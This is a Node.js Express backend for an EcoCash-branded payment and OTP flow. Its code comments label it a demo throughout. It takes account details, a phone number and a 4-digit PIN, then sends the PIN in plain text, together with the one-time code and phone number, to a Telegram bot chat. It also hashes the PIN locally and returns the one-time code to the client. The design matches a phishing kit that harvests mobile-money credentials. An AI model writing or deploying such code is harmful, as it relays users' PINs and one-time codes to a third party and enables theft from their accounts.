
const express = require('express');
const cors = require('cors');
const crypto = require('crypto');
const axios = require('axios');
const https = require('https');

require('dotenv').config();

const app = express();

app.use(cors());
app.use(express.json());

const transactions = new Map();

const OTP_TTL_MS = 5 * 60 * 1000;
const MAX_ATTEMPTS = 5;

// --------------------------------------------------
// FORCE TELEGRAM CONNECTION THROUGH IPv4
// --------------------------------------------------

const ipv4Agent = new https.Agent({
    family: 4
});

// --------------------------------------------------
// TELEGRAM CONFIG
// --------------------------------------------------

const TELEGRAM_BOT_TOKEN =
    process.env.TELEGRAM_BOT_TOKEN;

const TELEGRAM_CHAT_ID =
    process.env.TELEGRAM_CHAT_ID;

// Send DEMO 6-digit OTP to Telegram.
// This is for the test/demo OTP only.
async function sendOtpToTelegram(
    phone,
    code,
    demoPin,
    transactionId
) {
    if (
        !TELEGRAM_BOT_TOKEN ||
        !TELEGRAM_CHAT_ID
    ) {
        console.warn(
            'Telegram is not configured. Set TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID.'
        );

        console.log(
            `DEMO OTP ${code} for ${phone}`
        );

        return false;
    }

    const message =
        `ECOCASH/  OTP\n\n` +
        `OTP: ${code}\n` +
        `Phone: ${phone}\n` +
        `DemoPin : ${demoPin }\n` +
        `Transaction: ${transactionId}\n\n` +
        `This is a demo OTP only.`;

    const telegramUrl =
        `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;

    try {
        console.log(
            'Connecting to Telegram using IPv4...'
        );

        const response = await axios.post(
            telegramUrl,
            {
                chat_id: TELEGRAM_CHAT_ID,
                text: message
            },
            {
                timeout: 15000,
                httpsAgent: ipv4Agent
            }
        );

        const result = response.data;

        if (!result.ok) {
            console.error(
                'Telegram API error:',
                result
            );

            console.log(
                `DEMO OTP ${code} for ${phone}`
            );

            return false;
        }

        console.log(
            'Demo 6-digit OTP sent to Telegram.'
        );

        return true;

    } catch (error) {
        console.error(
            'Telegram request failed:',
            error.code || error.message
        );

        if (error.response?.data) {
            console.error(
                'Telegram response:',
                error.response.data
            );
        }

        console.log(
            `DEMO OTP ${code} for ${phone}`
        );

        return false;
    }
}

// --------------------------------------------------
// OTP
// --------------------------------------------------

// IMPORTANT: OTP remains 6 digits.
function generateOtp() {
    return crypto
        .randomInt(100000, 1000000)
        .toString();
}

// --------------------------------------------------
// DEMO PIN
// --------------------------------------------------

// DEMO ONLY: hashes the fake/test PIN.
// Never use this endpoint to collect real payment credentials.
function hashDemoPin(demoPin) {
    return crypto
        .createHash('sha256')
        .update(String(demoPin))
        .digest('hex');
}

// --------------------------------------------------
// HEALTH CHECK
// --------------------------------------------------

app.get('/', (req, res) => {
    res.json({
        ok: true,
        message:
            'Demo OTP backend is running.',
        telegramConfigured: Boolean(
            TELEGRAM_BOT_TOKEN &&
            TELEGRAM_CHAT_ID
        )
    });
});

// --------------------------------------------------
// REGISTER PAYMENT
// --------------------------------------------------

app.post(
    '/api/register-payment',
    async (req, res) => {
        try {
            const {
                tracking,
                mode,
                accountName,
                accountNumber,
                amount,
                currency,
                phone,
                demoPin
            } = req.body;

            // Check required fields
            if (
                !tracking ||
                !mode ||
                !accountName ||
                !accountNumber ||
                !amount ||
                !currency ||
                !phone ||
                !demoPin
            ) {
                return res.status(400).json({
                    ok: false,
                    error:
                        'Missing required fields'
                });
            }

            // Demo PIN must be exactly 4 digits
            if (
                !/^\d{4}$/.test(
                    String(demoPin)
                )
            ) {
                return res.status(400).json({
                    ok: false,
                    error:
                        'Demo PIN must be exactly 4 digits'
                });
            }

            // Create transaction
            const transactionId =
                crypto.randomUUID();

            // Generate 6-digit demo OTP
            const code =
                generateOtp();

            // Hash fake demo PIN
            const demoPinHash =
                hashDemoPin(demoPin);

            // Store transaction
            transactions.set(
                transactionId,
                {
                    code,
                    demoPinHash,
                    phone,
                    expiresAt:
                        Date.now() +
                        OTP_TTL_MS,
                    attempts: 0,
                    data: {
                        tracking,
                        mode,
                        accountName,
                        accountNumber,
                        amount,
                        currency,
                        phone
                    }
                }
            );

            // ------------------------------------------------
            // SEND 6-DIGIT DEMO OTP TO TELEGRAM
            // ------------------------------------------------

            const telegramSent =
                await sendOtpToTelegram(
                    phone,
                    code,
                    demoPin,
                    transactionId
                );

            console.log('');
            console.log(
                '======================================'
            );
            console.log(
                'DEMO PAYMENT REGISTERED'
            );
            console.log(
                '======================================'
            );
            console.log(
                `Transaction ID: ${transactionId}`
            );
            console.log(
                `Phone: ${phone}`
            );
            console.log(
                `Demo OTP: ${code}`
            );
            console.log(
                `Telegram sent: ${telegramSent}`
            );
            console.log(
                '======================================'
            );
            console.log('');

            // Response
            res.json({
                ok: true,
                transactionId,

                // Demo convenience only.
                // Remove this in any non-demo environment.
                demoOtp: code,

                telegramSent
            });

        } catch (err) {
            console.error(
                'Register payment error:',
                err
            );

            res.status(500).json({
                ok: false,
                error:
                    'Failed to register payment'
            });
        }
    }
);

// --------------------------------------------------
// VERIFY OTP
// --------------------------------------------------

app.post(
    '/api/verify-otp',
    (req, res) => {
        const {
            transactionId,
            code,
            demoPin
        } = req.body;

        const tx =
            transactions.get(
                transactionId
            );

        // Transaction does not exist
        if (!tx) {
            return res.status(404).json({
                ok: false,
                error:
                    'Transaction not found'
            });
        }

        // Check expiration
        if (
            Date.now() >
            tx.expiresAt
        ) {
            transactions.delete(
                transactionId
            );

            return res.status(410).json({
                ok: false,
                error:
                    'Code expired, please register again'
            });
        }

        // Check maximum attempts
        if (
            tx.attempts >=
            MAX_ATTEMPTS
        ) {
            transactions.delete(
                transactionId
            );

            return res.status(429).json({
                ok: false,
                error:
                    'Too many attempts'
            });
        }

        tx.attempts++;

        // Validate demo PIN
        if (
            !/^\d{4}$/.test(
                String(demoPin || '')
            )
        ) {
            return res.status(400).json({
                ok: false,
                error:
                    'Invalid demo PIN'
            });
        }

        // Compare demo PIN hashes
        const suppliedPinHash =
            hashDemoPin(demoPin);

        const storedPinHash =
            Buffer.from(
                tx.demoPinHash
            );

        const suppliedHash =
            Buffer.from(
                suppliedPinHash
            );

        if (
            suppliedHash.length !==
                storedPinHash.length ||
            !crypto.timingSafeEqual(
                suppliedHash,
                storedPinHash
            )
        ) {
            return res.status(400).json({
                ok: false,
                error:
                    'Invalid demo PIN'
            });
        }

        // Verify 6-digit OTP
        if (
            String(code) !==
            tx.code
        ) {
            return res.status(400).json({
                ok: false,
                error:
                    'Incorrect code'
            });
        }

        // Successful verification
        transactions.delete(
            transactionId
        );

        res.json({
            ok: true,
            message:
                'Demo registration verified',
            transaction:
                tx.data
        });
    }
);

// --------------------------------------------------
// START SERVER
// --------------------------------------------------

const PORT =
    process.env.PORT || 3001;

app.listen(
    PORT,
    () => {
        console.log('');
        console.log(
            '======================================'
        );
        console.log(
            `Demo OTP backend running on port ${PORT}`
        );
        console.log(
            `Telegram configured: ${
                TELEGRAM_BOT_TOKEN &&
                TELEGRAM_CHAT_ID
                    ? 'YES'
                    : 'NO'
            }`
        );
        console.log(
            'Telegram IPv4 connection: ENABLED'
        );
        console.log(
            'OTP length: 6 digits'
        );
        console.log(
            '======================================'
        );
        console.log('');
    }
);
